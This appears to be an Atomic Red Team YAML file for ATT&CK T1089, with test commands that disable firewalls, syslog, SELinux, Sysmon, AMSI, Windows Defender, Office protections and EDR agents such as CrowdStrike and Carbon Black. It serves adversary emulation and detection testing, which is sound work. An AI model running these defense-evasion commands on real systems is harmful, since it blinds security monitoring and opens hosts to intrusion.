---
attack_technique: T1089
display_name: Disabling Security Tools

atomic_tests:
- name: Disable iptables firewall
  auto_generated_guid: 2f07e566-b61a-4bc1-b9f2-52e055b49c42
  description: |
    Disables the iptables firewall
  supported_platforms:
    - linux
  executor:
    name: sh
    command: |
      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
      then
        service iptables stop
        chkconfig off iptables
        service ip6tables stop
        chkconfig off ip6tables
      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
        systemctl stop firewalld
        systemctl disable firewalld
      fi

- name: Disable syslog
  auto_generated_guid: 66b14b38-82ff-4382-a36d-188866bda558
  description: |
    Disables syslog collection
  supported_platforms:
    - linux
  executor:
    name: sh
    command: |
      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
      then
        service rsyslog stop
        chkconfig off rsyslog
      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
        systemctl stop rsyslog
        systemctl disable rsyslog
      fi

- name: Disable Cb Response
  auto_generated_guid: 94930d61-4065-4288-b388-cffd04f18a1f
  description: |
    Disable the Cb Response service
  supported_platforms:
    - linux
  executor:
    name: sh
    command: |
      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
      then
        service cbdaemon stop
        chkconfig off cbdaemon
      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
        systemctl stop cbdaemon
        systemctl disable cbdaemon
      fi

- name: Disable SELinux
  auto_generated_guid: 1afb3484-8cf3-4482-a460-61c8f5d05410
  description: |
    Disables SELinux enforcement
  supported_platforms:
    - linux
  executor:
    name: sh
    command: |
      setenforce 0

- name: Stop Crowdstrike Falcon on Linux
  auto_generated_guid: bbf2129e-5c39-4357-9f8e-9e2cdba6cfbb
  description: |
    Stop and disable Crowdstrike Falcon on Linux
  supported_platforms:
    - linux
  executor:
    name: sh
    elevation_required: true
    command: |
      sudo systemctl stop falcon-sensor.service
      sudo systemctl disable falcon-sensor.service
    cleanup_command: |
      sudo systemctl enable falcon-sensor.service
      sudo systemctl start falcon-sensor.service

- name: Disable Carbon Black Response
  auto_generated_guid: c8c68e80-4559-4b98-8513-fb6900c63d55
  description: |
    Disables Carbon Black Response
  supported_platforms:
    - macos
  executor:
    name: sh
    command: |
      sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist

- name: Disable LittleSnitch
  auto_generated_guid: 61a766ce-8f68-4367-81c1-6ad95cda867b
  description: |
    Disables LittleSnitch
  supported_platforms:
    - macos
  executor:
    name: sh
    command: |
      sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist

- name: Disable OpenDNS Umbrella
  auto_generated_guid: d5fd958c-3236-41f0-8769-e137717a7f13
  description: |
    Disables OpenDNS Umbrella
  supported_platforms:
    - macos
  executor:
    name: sh
    command: |
      sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist

- name: Stop and unload Crowdstrike Falcon on macOS
  auto_generated_guid: de3e5ad2-e734-4003-af87-7af5bee0d363
  description: |
    Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS
  supported_platforms:
    - macos
  input_arguments:
    falcond_plist:
      description: The path of the Crowdstrike Falcon plist file
      type: path
      default: /Library/LaunchDaemons/com.crowdstrike.falcond.plist
    userdaemon_plist:
      description: The path of the Crowdstrike Userdaemon plist file
      type: path
      default: /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist 
  executor:
    name: sh
    elevation_required: true
    command: |
      sudo launchctl unload #{falcond_plist}
      sudo launchctl unload #{userdaemon_plist}

- name: Unload Sysmon Filter Driver
  auto_generated_guid: 603e0800-87d2-40a1-95ee-b5d08de6e2e8
  description: |
    Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
    run the prereq_command's and it should fail with an error of "sysmon filter must be loaded".
  supported_platforms:
    - windows
  input_arguments:
    sysmon_driver:
      description: The name of the Sysmon filter driver (this can change from the default)
      type: string
      default: SysmonDrv

  dependency_executor_name: powershell
  dependencies:
  - description: |
      Sysmon must be downloaded
    prereq_command: |
      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
    get_prereq_command: |
      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
      Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
      Remove-Item $env:TEMP\Sysmon.zip -Force
  - description: |
      sysmon must be Installed
    prereq_command: |
      if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
    get_prereq_command: |
      if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
      { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
  - description: |
      sysmon filter must be loaded
    prereq_command: |
      if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }
    get_prereq_command: |
      sysmon -u
      sysmon -accepteula -i

  executor:
    name: command_prompt
    elevation_required: true
    prereq_command: |
      fltmc.exe filters | findstr #{sysmon_driver}
    command: |
      fltmc.exe unload #{sysmon_driver}
    cleanup_command: |
      sysmon -u -i > nul 2>&1
      sysmon -i -accepteula -i > nul 2>&1
      %temp%\Sysmon\sysmon.exe -u > nul 2>&1
      %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1

- name: Disable Windows IIS HTTP Logging
  auto_generated_guid: 2d693ad1-ad84-4318-a8cd-2bb64db091ae
  description: |
    Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
    This action requires HTTP logging configurations in IIS to be unlocked.
  supported_platforms:
    - windows

  input_arguments:
    website_name:
      description: The name of the website on a server
      type: string
      default: Default Web Site

  executor:
    name: powershell
    prereq_command: |
      if(Test-Path C:\Windows\System32\inetsrv\appcmd.exe) {exit 0} else {exit 1}
    command: |
      C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
    cleanup_command: |
      C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false

- name: Uninstall Sysmon
  auto_generated_guid: 6c47e616-ce99-4eff-8f33-8fcaa67af9ea
  description: |
    Uninstall Sysinternals Sysmon for Defense Evasion
  supported_platforms:
    - windows

  input_arguments:
    sysmon_exe:
      description: The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)
      type: Path
      default: PathToAtomicsFolder\T1089\bin\sysmon.exe

  dependency_executor_name: powershell
  dependencies:
  - description: |
      Sysmon executable must be available
    prereq_command: |
      if(cmd /c where sysmon) {exit 0} else {exit 1}
    get_prereq_command: |
      $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
      New-Item -ItemType Directory $parentpath -Force | Out-Null
      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
      Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
      if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
  - description: |
      Sysmon must be installed
    prereq_command: |
      if(cmd /c sc query sysmon) { exit 0} else { exit 1}
    get_prereq_command: |
      cmd /c sysmon -i -accepteula

  executor:
    name: command_prompt
    elevation_required: true
    command: |
      sysmon -u
    cleanup_command: |
      sysmon -i -accepteula >nul 2>&1

- name: AMSI Bypass - AMSI InitFailed
  auto_generated_guid: ecccea4b-7599-4bb2-8490-29a31f359294
  description: |
    Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
    Upon execution, no output is displayed.

    https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    cleanup_command: |
      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)

- name: AMSI Bypass - Remove AMSI Provider Reg Key
  auto_generated_guid: 1833bdad-17ab-4e1a-892f-6741613eac48
  description: |
    With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
    This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
    Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: true
    command: |
       Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
    cleanup_command: |
       New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null

- name: Disable Arbitrary Security Windows Service
  auto_generated_guid: 3baf0a65-5432-4ec2-af77-02e3d0d4d9a2
  description: |
    With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
    Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
    To verify that the service has stopped, run "sc query McAfeeDLPAgentService"
  supported_platforms:
    - windows
  input_arguments:
    service_name:
      description: The name of the service to stop
      type: String
      default: McAfeeDLPAgentService
  executor:
    name: command_prompt
    elevation_required: true
    command: |
       net.exe stop #{service_name}
       sc.exe config #{service_name} start= disabled
    cleanup_command: |
       sc.exe config #{service_name} start= auto >nul 2>&1
       net.exe start #{service_name} >nul 2>&1

- name: Tamper with Windows Defender ATP PowerShell
  auto_generated_guid: 601c5ba0-00f9-481f-9ab6-b974a6c6ea81
  description: |
    Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
    in Windows settings.
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: true
    command: |
      Set-MpPreference -DisableRealtimeMonitoring 1
      Set-MpPreference -DisableBehaviorMonitoring 1
      Set-MpPreference -DisableScriptScanning 1
      Set-MpPreference -DisableBlockAtFirstSeen 1
    cleanup_command: |
      Set-MpPreference -DisableRealtimeMonitoring 0
      Set-MpPreference -DisableBehaviorMonitoring 0
      Set-MpPreference -DisableScriptScanning 0
      Set-MpPreference -DisableBlockAtFirstSeen 0

- name: Tamper with Windows Defender Command Prompt
  auto_generated_guid: 77a19156-1c96-424a-a5db-e9a5067bacba
  description: |
    Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
    However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, "Access Denied"
    will be displayed twice and the WinDefend service status will be displayed.
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      sc stop WinDefend
      sc config WinDefend start=disabled
      sc query WinDefend
    cleanup_command: |
      sc start WinDefend >nul 2>&1
      sc config WinDefend start=enabled >nul 2>&1

- name: Tamper with Windows Defender Registry
  auto_generated_guid: add29adc-e821-46bc-9e04-8d0c1eeb03b0
  description: |
    Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
    grayed out and have no info.
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: true
    command: |
      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
    cleanup_command: |
      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0

- name: Disable Microft Office Security Features
  auto_generated_guid: 90d6ba59-f8e0-40f1-9aa7-dc9bfae23abb
  description: |
    Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
    show any warning before editing the document.


    https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
    cleanup_command: |
      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings"
      Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"

- name: Remove Windows Defender Definition Files
  auto_generated_guid: f6afdf76-75d1-4ebe-9a91-5fd0600cb020
  description: |
    Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
    On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
    command will say completed.

    https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

- name: Stop and Remove Arbitrary Security Windows Service
  auto_generated_guid: 41d6a50e-5e8f-46ee-8a29-618f1ca3bc30
  description: |
    Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.
  supported_platforms:
    - windows
  input_arguments:
     service_name:
       description: The name of the service to remove
       type: String
       default: McAfeeDLPAgentService
  executor:
    name: powershell
    elevation_required: true
    command: |
      Stop-Service -Name #{service_name}
      Remove-Service -Name #{service_name}

- name: Uninstall Crowdstrike Falcon on Windows
  auto_generated_guid: e6509134-e89c-4cf5-ae35-5a5dc16c77f5
  description: |
    Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.
  supported_platforms:
    - windows
  input_arguments:
    falcond_path:
      description: The Crowdstrike Windows Sensor path. The Guid always changes.
      type: path
      default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe
  executor:
    name: powershell
    elevation_required: true
    command: |
      if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}